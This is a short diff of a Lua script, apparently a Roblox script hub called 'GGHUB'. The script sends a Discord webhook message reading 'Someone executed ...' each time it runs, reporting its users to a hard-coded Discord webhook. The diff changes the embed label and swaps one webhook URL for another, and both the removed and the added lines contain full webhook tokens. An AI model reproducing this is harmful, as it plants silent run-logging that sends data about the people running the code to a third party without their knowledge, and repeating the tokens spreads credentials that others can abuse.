@@ -3453,7 +3453,7 @@ local function createWebhookData()
         ["embeds"] = {
             {
                 ["author"] = {
-                    ["name"] = "Someone executed your script",
+                    ["name"] = "Someone executed GGHUB :D",
                     ["url"] = "https://roblox.com",
                 },
                 ["description"] = string.format(
@@ -3491,7 +3491,7 @@ local function sendWebhook(webhookUrl, data)
 end
 
 -- Replace the webhook URL with your own URL
-local webhookUrl = "https://discord.com/api/webhooks/1327750343030997022/3qMLIMW_72e-Jc_Me43qkZ3ZuTO_ZSOLP2jonp-n_V1UWQ9ThGjS8bM-Zk0bmH1Oxt21"
+local webhookUrl = "https://discord.com/api/webhooks/1327965758273097778/J77TDzfo9bBPOsu_B1gweHCHOI-KK_y-NJP-d-8SlEAGEKj_yGjWBtnPJf_DTFrhyEpZ"
 local webhookData = createWebhookData()
 
 -- Sending the webhook
